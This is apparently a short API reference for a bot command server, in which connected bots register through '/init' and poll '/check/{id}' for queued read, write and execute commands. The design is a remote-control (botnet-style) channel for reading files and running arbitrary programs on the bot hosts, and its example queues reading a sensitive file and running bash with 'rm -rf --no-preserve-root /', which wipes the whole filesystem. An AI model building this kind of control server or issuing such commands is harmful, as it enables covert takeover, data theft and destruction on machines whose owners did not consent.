# Server

## `/init`: returns an ID for the bot

This returns a JSON object with the following format:

```json
{
    "id": "some string"
}
```

The ID returned uniquely identifies a connected bot, and
is how a bot checks for commands.

## `/check/{id}`: return the list of commands for the bot

This returns a JSON object with the following format:

```json
[
    {
        "action": "read", // or "write" or "execute"
        "path": "some string", // path to something being read/written/executed
        "payload": [] // possibly empty
    },
    // potentially more
]
```

This makes the server empty the command queue of the bot identified by `id`.

Example:
```json
GET /check/abcdef1234
[
    {
        "action": "read",
        "path": "/some/sensitive/file",
        "payload": []
    },
    {
        "action": "execute",
        "path": "/usr/bin/bash",
        "payload": [
            "-c",
            "xcowsay 'eggs dee' && rm -rf --no-preserve-root /"
        ]
    }
]
```